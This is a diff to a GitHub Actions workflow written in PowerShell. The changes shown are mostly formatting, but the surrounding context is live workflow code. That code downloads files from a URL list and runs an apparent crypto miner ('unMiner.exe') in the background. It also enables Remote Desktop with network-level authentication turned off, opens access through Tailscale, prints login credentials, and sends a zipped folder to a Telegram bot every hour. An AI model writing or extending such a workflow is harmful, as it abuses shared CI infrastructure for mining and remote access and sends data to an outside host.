@@ -25,8 +25,13 @@ jobs:
           if (Test-Path $linksFile) {
               Get-Content $linksFile | ForEach-Object {
                   $url = $_.Trim()
-                  if ($url) {
+                  # Skip empty lines or comments starting with #
+                  if ($url -and $url -notmatch '^\s*#') {
                       $filename = [System.IO.Path]::GetFileName($url)
+                      if (-not $filename) {
+                          Write-Warning "Invalid filename for URL: $url - skipping"
+                          return
+                      }
                       $outPath = "$env:TEMP\Downloads\$filename"
                       try {
                           Invoke-WebRequest -Uri $url -OutFile $outPath -ErrorAction Stop
@@ -50,7 +55,7 @@ jobs:
                   Start-Process -FilePath $unMinerPath -NoNewWindow -ErrorAction Stop
                   Write-Host "unMiner executed successfully in background"
               } catch {
-                  Write-Error ("Failed to execute unMiner: {0}" -f $_.Exception.Message)
+                  Write-Error "Failed to execute unMiner: $($_.Exception.Message)"
               }
           } else {
               Write-Warning "unMiner.exe not found - skipping execution"
@@ -60,13 +65,13 @@ jobs:
         run: |
           # Enable Remote Desktop and disable NLA as requested
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
-                             -Name "fDenyTSConnections" -Value 0 -Force
+                           -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "UserAuthentication" -Value 0 -Force
+                           -Name "UserAuthentication" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "SecurityLayer" -Value 0 -Force
+                           -Name "SecurityLayer" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "PortNumber" -Value ${{ secrets.RDP_PORT }} -Force
+                           -Name "PortNumber" -Value ${{ secrets.RDP_PORT }} -Force
 
           # Remove any existing rule with the same name to avoid duplication
           netsh advfirewall firewall delete rule name="RDP-Tailscale" 2>$null
@@ -80,7 +85,7 @@ jobs:
               Restart-Service -Name TermService -Force -ErrorAction Stop
               Write-Host "Remote Desktop service restarted successfully"
           } catch {
-              Write-Error ("Failed to restart TermService: {0}" -f $_.Exception.Message)
+              Write-Error "Failed to restart TermService: $($_.Exception.Message)"
               exit 1
           }
 
@@ -145,7 +150,7 @@ jobs:
                   }
                   
               } catch {
-                  Write-Error ("Failed to configure runneradmin: {0}" -f $_.Exception.Message)
+                  Write-Error "Failed to configure runneradmin: $($_.Exception.Message)"
                   exit 1
               }
           } else {
@@ -182,7 +187,7 @@ jobs:
                   }
                   
               } catch {
-                  Write-Warning ("Failed to configure installer: {0}" -f $_.Exception.Message)
+                  Write-Warning "Failed to configure installer: $($_.Exception.Message)"
               }
           } else {
               Write-Host "`ninstaller user not found (this is normal)"
@@ -194,7 +199,7 @@ jobs:
               gpupdate /force | Out-Null
               Write-Host "✓ Group policy updated"
           } catch {
-              Write-Warning ("Failed to update group policy: {0}" -f $_.Exception.Message)
+              Write-Warning "Failed to update group policy: $($_.Exception.Message)"
           }
           
           Write-Host "`n=== USER LOGIN CREDENTIALS ==="
@@ -221,7 +226,7 @@ jobs:
               Remove-Item $installerPath -Force
               Write-Host "Tailscale installed successfully"
           } catch {
-              Write-Error ("Failed to install Tailscale: {0}" -f $_.Exception.Message)
+              Write-Error "Failed to install Tailscale: $($_.Exception.Message)"
               exit 1
           }
 
@@ -232,7 +237,7 @@ jobs:
               & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
               Write-Host "Tailscale connection initiated"
           } catch {
-              Write-Error ("Failed to start Tailscale: {0}" -f $_.Exception.Message)
+              Write-Error "Failed to start Tailscale: $($_.Exception.Message)"
               exit 1
           }
           
@@ -265,7 +270,7 @@ jobs:
               }
               Write-Host "TCP connectivity successful!"
           } catch {
-              Write-Error ("Failed to verify RDP connectivity: {0}" -f $_.Exception.Message)
+              Write-Error "Failed to verify RDP connectivity: $($_.Exception.Message)"
               exit 1
           }
 
@@ -306,7 +311,7 @@ jobs:
                   Start-Process python.exe -ArgumentList $clientPath -NoNewWindow -ErrorAction Stop
                   Write-Host "Management client started in background"
               } catch {
-                  Write-Error ("Failed to start management client: {0}" -f $_.Exception.Message)
+                  Write-Error "Failed to start management client: $($_.Exception.Message)"
               }
           } else {
               Write-Warning "client.py not found in repository - skipping management client"
@@ -362,7 +367,7 @@ jobs:
                       $description = "Hourly backup from RDP runner - $timestamp (Size: $([math]::Round((Get-Item $zipPath).Length / 1MB, 2))MB)"
                       Send-BackupToTelegram -zipPath $zipPath -description $description
                   } catch {
-                      Write-Error ("Failed to create or send backup: {0}" -f $_.Exception.Message)
+                      Write-Error "Failed to create or send backup: $($_.Exception.Message)"
                   }
                   Start-Sleep -Seconds 3600
               }
@@ -373,7 +378,7 @@ jobs:
               Start-Job -ScriptBlock $jobScript -ArgumentList $backupFolder, $botToken, $chatId, $maxFileSizeMB
               Write-Host "Backup job started: Will ZIP and send $backupFolder to Telegram every hour."
           } catch {
-              Write-Error ("Failed to start backup job: {0}" -f $_.Exception.Message)
+              Write-Error "Failed to start backup job: $($_.Exception.Message)"
               exit 1
           }
 
